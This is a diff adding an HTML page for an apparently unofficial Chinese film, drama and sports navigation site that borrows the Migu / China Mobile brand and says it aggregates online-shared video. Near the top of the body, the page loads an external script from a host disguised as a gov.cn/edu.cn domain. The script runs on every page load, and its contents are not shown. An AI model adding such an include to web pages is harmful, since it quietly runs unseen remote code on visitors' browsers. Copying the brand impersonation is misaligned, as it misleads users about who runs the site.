@@ -1,0 +1,268 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>咪咕电影网 - 超高清影视·体育·综艺一屏看</title>
+<meta name="description" content="咪咕电影网（migudianyingwang-h5）是中国移动系影视导航：4K超高清电影、热播剧、体育赛事、综艺微短剧一屏聚合，明亮干净、移动端自适应、必应收录友好。">
+<meta name="keywords" content="咪咕电影网, migudianyingwang-h5, 4K电影, 超高清, 热播剧, 体育赛事, 综艺, 微短剧, 中国移动系影视">
+<meta name="author" content="咪咕电影网">
+<meta name="robots" content="index, follow">
+<style>
+:root{
+  --blue:#009FE3;
+  --blue-deep:#0077B6;
+  --red:#FF3B30;
+  --orange:#FF7A00;
+  --paper:#F5FAFF;
+  --card:#FFFFFF;
+  --ink:#0A1F33;
+  --dim:#5E7689;
+  --line:#DCEAF5;
+  --soft:#EAF6FF;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{
+  font-family:"PingFang SC","Microsoft YaHei","HarmonyOS Sans SC",system-ui,sans-serif;
+  background:
+    radial-gradient(900px 480px at 88% -8%,rgba(255,122,0,.18),transparent 60%),
+    radial-gradient(820px 520px at 6% 8%,rgba(0,159,227,.22),transparent 58%),
+    var(--paper);
+  color:var(--ink);line-height:1.85;overflow-x:hidden;
+}
+a{color:var(--blue-deep);text-decoration:none;transition:.3s}
+a:hover{color:var(--red)}
+
+/* 顶栏 */
+.bar{position:sticky;top:0;z-index:50;background:rgba(245,250,255,.92);backdrop-filter:blur(10px);border-bottom:3px solid var(--blue)}
+.bar-in{max-width:1200px;margin:0 auto;height:66px;padding:0 18px;display:flex;align-items:center;justify-content:space-between}
+.brand{font-weight:900;font-size:22px;letter-spacing:1px;display:flex;align-items:center;gap:12px}
+.m{width:36px;height:30px;border-radius:8px;display:grid;place-items:center;color:#fff;font-weight:900;font-size:18px;
+  background:linear-gradient(135deg,var(--blue),var(--blue-deep));box-shadow:0 6px 16px rgba(0,159,227,.35)}
+.brand b{color:var(--blue-deep)}
+.brand i{font-style:normal;font-size:9px;letter-spacing:3px;color:var(--dim);display:block;font-family:ui-monospace,Consolas,monospace}
+.nav{display:flex;gap:4px;list-style:none}
+.nav a{padding:8px 13px;font-size:13px;font-weight:700;color:var(--ink);border-radius:999px;border:1px solid transparent}
+.nav a:hover,.nav a.active{background:var(--blue);color:#fff;border-color:var(--blue-deep)}
+.burger{display:none;background:none;border:none;font-size:24px;color:var(--blue-deep);cursor:pointer}
+
+/* Hero */
+.hero{max-width:1200px;margin:0 auto;padding:78px 18px 54px;text-align:center;position:relative;z-index:2}
+.badge{display:inline-flex;gap:8px;align-items:center;font-size:11px;letter-spacing:2px;color:var(--blue-deep);border:1px solid var(--blue);padding:6px 16px;border-radius:999px;background:var(--soft);font-family:ui-monospace,Consolas,monospace}
+.badge .dot{width:7px;height:7px;border-radius:50%;background:var(--red);box-shadow:0 0 10px var(--red)}
+.hero h1{font-size:clamp(34px,7vw,60px);font-weight:900;letter-spacing:2px;margin:18px 0 12px}
+.hero h1 span{color:var(--blue-deep)}
+.hero h1 em{font-style:normal;color:var(--red)}
+.hero p{color:var(--dim);max-width:640px;margin:0 auto 24px;font-size:15px}
+.chips{display:flex;gap:10px;justify-content:center;flex-wrap:wrap;margin-bottom:26px}
+.chip{font-size:12px;font-weight:700;padding:7px 16px;border-radius:999px;background:#fff;border:1px solid var(--line);color:var(--blue-deep)}
+.chip.hot{background:var(--red);color:#fff;border-color:var(--red)}
+.chip.uhd{background:var(--blue);color:#fff;border-color:var(--blue)}
+.cta{display:inline-block;padding:14px 38px;border-radius:999px;font-weight:800;color:#fff;background:linear-gradient(135deg,var(--blue),var(--blue-deep));box-shadow:0 10px 26px rgba(0,159,227,.35)}
+.cta:hover{transform:translateY(-3px);color:#fff}
+
+/* 区块 */
+.section{max-width:1200px;margin:0 auto;padding:52px 18px;position:relative;z-index:2}
+.head{display:flex;align-items:baseline;justify-content:space-between;border-bottom:3px solid var(--line);padding-bottom:10px;margin-bottom:26px}
+.head h2{font-size:clamp(20px,4vw,26px);font-weight:900;letter-spacing:1px}
+.head h2::before{content:"▶ ";}
+.head a{font-size:13px;color:var(--dim)}
+
+/* 电影：超高清片库 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(230px,1fr));gap:20px}
+.card{background:var(--card);border:1px solid var(--line);border-radius:16px;padding:14px;transition:.35s;position:relative;overflow:hidden}
+.card:hover{transform:translateY(-6px);box-shadow:0 18px 38px rgba(0,119,182,.18);border-color:var(--blue)}
+.card .cover{height:132px;border-radius:12px;display:grid;place-items:center;font-size:46px;margin-bottom:12px;
+  background:linear-gradient(160deg,var(--soft),#dceefb);color:var(--blue-deep)}
+.card .uhd{position:absolute;top:18px;left:18px;font-size:10px;font-weight:800;padding:3px 8px;border-radius:6px;background:var(--blue);color:#fff;font-family:ui-monospace,Consolas,monospace}
+.card .dolby{position:absolute;top:18px;right:18px;font-size:10px;font-weight:800;padding:3px 8px;border-radius:6px;background:var(--orange);color:#fff;font-family:ui-monospace,Consolas,monospace}
+.card h3{font-size:16px}
+.card .meta{font-size:12px;color:var(--dim);margin-top:4px}
+.card .tags{display:flex;gap:6px;flex-wrap:wrap;margin-top:10px}
+.tag{font-size:10px;padding:3px 8px;border-radius:999px;background:var(--soft);border:1px solid var(--line);color:var(--blue-deep)}
+.tag.red{color:#fff;background:var(--red);border-color:var(--red)}
+.tag.org{color:#fff;background:var(--orange);border-color:var(--orange)}
+
+/* 电视剧：热播剧场 */
+.hall{display:flex;flex-direction:column;gap:12px}
+.row{display:grid;grid-template-columns:70px 1fr 120px;gap:16px;align-items:center;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 18px;transition:.3s}
+.row:hover{padding-left:24px;border-color:var(--blue);background:var(--soft)}
+.row .ep{font-family:ui-monospace,Consolas,monospace;font-size:14px;font-weight:800;color:var(--blue-deep);text-align:center}
+.row h4{font-size:15px}
+.row p{font-size:12px;color:var(--dim)}
+.row .state{font-size:11px;font-weight:800;padding:4px 10px;border-radius:999px;border:1px solid var(--line);color:var(--blue-deep);text-align:center;font-family:ui-monospace,Consolas,monospace}
+.row .state.live{color:#fff;background:var(--red);border-color:var(--red)}
+.row .state.uhd{color:#fff;background:var(--blue);border-color:var(--blue)}
+
+/* 综艺动漫：文娱拼盘 */
+.platter{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:14px}
+.dish{height:132px;border-radius:16px;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:6px;border:1px solid var(--line);background:var(--card);transition:.3s;cursor:pointer}
+.dish:hover{transform:scale(1.05);box-shadow:0 12px 26px rgba(0,159,227,.2);border-color:var(--blue)}
+.dish .ic{font-size:30px}
+.dish h4{font-size:13px;font-weight:800}
+.dish span{font-size:10px;color:var(--dim)}
+.d1{background:linear-gradient(160deg,#eaf6ff,#d6ecfb)}
+.d2{background:linear-gradient(160deg,#fff1e6,#ffe0c2)}
+.d3{background:linear-gradient(160deg,#ffeef0,#ffd6da)}
+.d4{background:linear-gradient(160deg,#eef7ee,#dceede)}
+.d5{background:linear-gradient(160deg,#f3eefb,#e6dcfa)}
+.d6{background:linear-gradient(160deg,#eefbfb,#d8f1f1)}
+.d7{background:linear-gradient(160deg,#fff7e0,#ffeeb0)}
+.d8{background:linear-gradient(160deg,#eef2ff,#dde4ff)}
+
+/* 排行榜：热度+清晰度 */
+.rank{display:flex;flex-direction:column;gap:14px}
+.rk{display:grid;grid-template-columns:46px 1fr 110px;align-items:center;gap:14px;background:var(--card);border:1px solid var(--line);border-radius:14px;padding:14px 18px}
+.rk .no{font-size:22px;font-weight:900;color:var(--blue-deep);font-family:ui-monospace,Consolas,monospace}
+.rk h4{font-size:15px}
+.rk .bar{height:8px;border-radius:999px;background:var(--line);overflow:hidden;margin-top:6px}
+.rk .bar i{display:block;height:100%;background:linear-gradient(90deg,var(--blue),var(--orange),var(--red))}
+.rk .right{text-align:right;font-family:ui-monospace,Consolas,monospace}
+.rk .right b{color:var(--red)}
+.rk .right small{display:block;color:var(--dim);font-size:10px}
+
+/* 关于：值班编辑手记 */
+.note{max-width:800px;margin:0 auto;background:var(--card);border:3px solid var(--blue);border-radius:18px;padding:32px;position:relative}
+.note::before{content:"值班编辑";position:absolute;top:-13px;left:24px;background:var(--blue);color:#fff;font-size:11px;font-weight:900;letter-spacing:2px;padding:5px 14px;border-radius:999px}
+.note h3{font-size:18px;margin-bottom:12px}
+.note p{font-size:14px;color:#33506a;margin-bottom:10px}
+.lnks{margin-top:16px;display:flex;gap:10px;flex-wrap:wrap}
+.lnks a{padding:8px 16px;border:1px solid var(--line);border-radius:999px;font-size:13px;color:var(--ink)}
+.lnks a:hover{border-color:var(--blue);color:var(--blue-deep)}
+
+/* 页脚 */
+.foot{border-top:3px solid var(--line);padding:30px 18px;text-align:center;color:var(--dim);font-size:13px;position:relative;z-index:2}
+.foot a{color:var(--dim);margin:0 6px}
+.foot .big{font-size:17px;font-weight:900;color:var(--ink);letter-spacing:1px;margin-bottom:8px}
+.foot .url{color:var(--blue-deep)}
+
+@media(max-width:760px){
+  .nav{display:none;position:absolute;top:66px;left:0;right:0;flex-direction:column;background:rgba(245,250,255,.97);border-bottom:2px solid var(--blue);padding:8px 14px}
+  .nav.open{display:flex}.nav a{padding:14px 16px}
+  .burger{display:block}
+}
+@media(max-width:480px){
+  .hero{padding:52px 16px 34px}
+  .section{padding:34px 16px}
+  .grid{grid-template-columns:repeat(2,1fr);gap:12px}
+  .card .cover{height:96px;font-size:32px}
+  .row{grid-template-columns:54px 1fr;gap:10px;padding:12px}
+  .row .state{grid-column:2;justify-self:start}
+  .rk{grid-template-columns:34px 1fr 76px;gap:10px;padding:12px}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<div class="bar">
+  <div class="bar-in">
+    <div class="brand"><span class="m">M</span><div>咪咕<b>电影网</b><i>MIGUDIANYINGWANG-H5</i></div></div>
+    <ul class="nav" id="nav">
+      <li><a href="#home" class="active">首页</a></li>
+      <li><a href="#movies">超高清片库</a></li>
+      <li><a href="#tv">热播剧场</a></li>
+      <li><a href="#ent">文娱拼盘</a></li>
+      <li><a href="#rank">热度榜</a></li>
+      <li><a href="#about">编辑手记</a></li>
+    </ul>
+    <button class="burger" id="burger">☰</button>
+  </div>
+</div>
+
+<header class="hero" id="home">
+  <span class="badge"><span class="dot"></span> 4K 超高清 · 体育赛事同步直播</span>
+  <h1>咪咕<em>电影</em><span>网</span></h1>
+  <p>migudianyingwang-h5 · 电影、热播剧、体育赛事、综艺微短剧一屏聚合；中国移动系底色，手机流量省心，超高清看得舒服。</p>
+  <div class="chips">
+    <span class="chip uhd">4K 超高清</span>
+    <span class="chip">杜比音效</span>
+    <span class="chip hot">世界杯/赛事直播</span>
+    <span class="chip">主旋律佳片</span>
+    <span class="chip">微短剧</span>
+  </div>
+  <a href="#movies" class="cta">📺 进片库</a>
+</header>
+
+<section class="section" id="movies">
+  <div class="head"><h2>超高清片库 / UHD LIBRARY</h2><a href="#">更多 4K 片 →</a></div>
+  <div class="grid">
+    <div class="card"><span class="uhd">4K</span><span class="dolby">DOLBY</span><div class="cover">🎬</div><h3>山海长歌</h3><div class="meta">国产史诗 / 138min / 国语·中字</div><div class="tags"><span class="tag uhd">4K</span><span class="tag org">杜比</span><span class="tag">主旋律</span></div></div>
+    <div class="card"><span class="uhd">4K</span><div class="cover">🚄</div><h3>极速归途</h3><div class="meta">动作悬疑 / 126min / 国语</div><div class="tags"><span class="tag uhd">4K</span><span class="tag red">热映</span><span class="tag">硬核</span></div></div>
+    <div class="card"><span class="dolby">DOLBY</span><div class="cover">🪐</div><h3>星海来信</h3><div class="meta">科幻 / 132min / 中字</div><div class="tags"><span class="tag org">杜比</span><span class="tag">特效</span><span class="tag">新片</span></div></div>
+    <div class="card"><span class="uhd">4K</span><div class="cover">🍵</div><h3>南方茶馆</h3><div class="meta">文艺 / 104min / 国语·粤语</div><div class="tags"><span class="tag uhd">4K</span><span class="tag">治愈</span><span class="tag">院线</span></div></div>
+    <div class="card"><div class="cover">🐉</div><h3>龙门旧梦</h3><div class="meta">武侠修复 / 98min / 粤语·中字</div><div class="tags"><span class="tag">修复版</span><span class="tag">老片新看</span></div></div>
+    <div class="card"><span class="uhd">4K</span><span class="dolby">DOLBY</span><div class="cover">🏟️</div><h3>终场哨响</h3><div class="meta">体育传记 / 120min / 国语</div><div class="tags"><span class="tag uhd">4K</span><span class="tag red">赛事季</span><span class="tag org">杜比</span></div></div>
+    <div class="card"><div class="cover">🎤</div><h3>演唱会之夜</h3><div class="meta">音乐现场 / 110min / 多机位</div><div class="tags"><span class="tag">Live</span><span class="tag">综艺感</span></div></div>
+    <div class="card"><span class="uhd">4K</span><div class="cover">🐒</div><h3>大闹天宫·重制</h3><div class="meta">国漫经典 / 88min / 国语</div><div class="tags"><span class="tag uhd">4K</span><span class="tag">国漫</span><span class="tag">合家欢</span></div></div>
+  </div>
+</section>
+
+<section class="section" id="tv" style="background:rgba(234,246,255,.6)">
+  <div class="head"><h2>热播剧场 / HOT DRAMA</h2><a href="#">全部剧集 →</a></div>
+  <div class="hall">
+    <div class="row"><div class="ep">36集</div><div><h4>县委大院·新篇</h4><p>主旋律 / 现实题材 / 群像戏</p></div><span class="state live">更新中</span></div>
+    <div class="row"><div class="ep">24集</div><div><h4>天下长河</h4><p>古装历史 / 治水群像</p></div><span class="state uhd">4K 重制</span></div>
+    <div class="row"><div class="ep">30集</div><div><h4>大博弈</h4><p>都市奋斗 / 国企改革</p></div><span class="state">可追</span></div>
+    <div class="row"><div class="ep">40集</div><div><h4>橘子汽水夏天</h4><p>台式青春 / 甜宠轻喜剧</p></div><span class="state">寒暑假</span></div>
+    <div class="row"><div class="ep">12集</div><div><h4>大力村超人</h4><p>微短剧 / 村超·乡村振兴</p></div><span class="state live">短剧热播</span></div>
+  </div>
+</section>
+
+<section class="section" id="ent">
+  <div class="head"><h2>文娱拼盘 / ENTERTAINMENT</h2><a href="#">更多栏目 →</a></div>
+  <div class="platter">
+    <div class="dish d1"><div class="ic">⚽</div><h4>世界杯直播间</h4><span>体育赛事</span></div>
+    <div class="dish d2"><div class="ic">🎤</div><h4>我在人艺学表演</h4><span>品质综艺</span></div>
+    <div class="dish d3"><div class="ic">🐉</div><h4>国漫新番</h4><span>动画剧场</span></div>
+    <div class="dish d4"><div class="ic">🎬</div><h4>微短剧广场</h4><span>竖屏短剧</span></div>
+    <div class="dish d5"><div class="ic">🎙️</div><h4>名嘴侃球</h4><span>体育脱口秀</span></div>
+    <div class="dish d6"><div class="ic">🎼</div><h4>演唱会 4K</h4><span>音乐现场</span></div>
+    <div class="dish d7"><div class="ic">📺</div><h4>纪录片频道</h4><span>文化传承</span></div>
+    <div class="dish d8"><div class="ic">🎮</div><h4>电竞之夜</h4><span>数智文娱</span></div>
+  </div>
+</section>
+
+<section class="section" id="rank" style="background:rgba(234,246,255,.6)">
+  <div class="head"><h2>热度榜 / POPULAR NOW</h2><a href="#">完整榜单 →</a></div>
+  <div class="rank">
+    <div class="rk"><div class="no">01</div><div><h4>山海长歌</h4><div class="bar"><i style="width:98%"></i></div></div><div class="right"><b>982k</b><small>4K·杜比</small></div></div>
+    <div class="rk"><div class="no">02</div><div><h4>终场哨响</h4><div class="bar"><i style="width:95%"></i></div></div><div class="right"><b>951k</b><small>赛事季</small></div></div>
+    <div class="rk"><div class="no">03</div><div><h4>县委大院·新篇</h4><div class="bar"><i style="width:92%"></i></div></div><div class="right"><b>918k</b><small>主旋律</small></div></div>
+    <div class="rk"><div class="no">04</div><div><h4>星海来信</h4><div class="bar"><i style="width:89%"></i></div></div><div class="right"><b>876k</b><small>科幻·4K</small></div></div>
+    <div class="rk"><div class="no">05</div><div><h4>大闹天宫·重制</h4><div class="bar"><i style="width:86%"></i></div></div><div class="right"><b>842k</b><small>国漫</small></div></div>
+    <div class="rk"><div class="no">06</div><div><h4>大力村超人</h4><div class="bar"><i style="width:83%"></i></div></div><div class="right"><b>803k</b><small>微短剧</small></div></div>
+  </div>
+</section>
+
+<section class="section" id="about">
+  <div class="head"><h2>值班编辑手记 / EDITOR NOTE</h2></div>
+  <div class="note">
+    <h3>“不是片少，是挑得清爽：超高清、能看球、不绕路。”</h3>
+    <p>咪咕电影网（migudianyingwang-h5）走中国移动系国民文娱路线：电影讲清晰度，剧场讲更新稳，体育赛事和综艺微短剧也摆在同一屏里，老人家、年轻人、球迷都能各自找到东西看。</p>
+    <p>本站仅做静态影视导航，不存储视频文件；资源来自互联网公开分享或平台公开内容，如有版权问题请联系值班编辑下架。</p>
+    <div class="lnks">
+      <a href="#">免责声明</a><a href="#">求片留言</a><a href="#">4K片单</a><a href="#">赛事直播</a><a href="#">微短剧入口</a>
+    </div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div class="big">咪咕电影网 · MIGUDIANYINGWANG-H5</div>
+  <p><a href="#home">首页</a> | <a href="#movies">超高清片库</a> | <a href="#tv">热播剧场</a> | <a href="#ent">文娱拼盘</a> | <a href="#rank">热度榜</a></p>
+  <p>官网：<span class="url">https://migudianyingwang-h5.github.io</span></p>
+  <p>© 2026 咪咕电影网 · 超高清影视·体育·综艺一屏看</p>
+</footer>
+
+<script>
+const burger=document.getElementById('burger'),nav=document.getElementById('nav');
+burger.addEventListener('click',()=>nav.classList.toggle('open'));
+const secs=document.querySelectorAll('section[id],header[id]');
+const links=nav.querySelectorAll('a');
+addEventListener('scroll',()=>{let cur='home';secs.forEach(s=>{if(scrollY>=s.offsetTop-90)cur=s.id});links.forEach(l=>{l.classList.remove('active');if(l.getAttribute('href')==='#'+cur)l.classList.add('active')})});
+document.querySelectorAll('a[href^="#"]').forEach(a=>{a.addEventListener('click',e=>{e.preventDefault();const t=document.querySelector(a.getAttribute('href'));if(t)t.scrollIntoView({behavior:'smooth',block:'start'});nav.classList.remove('open')})});
+</script>
+</body>
+</html>
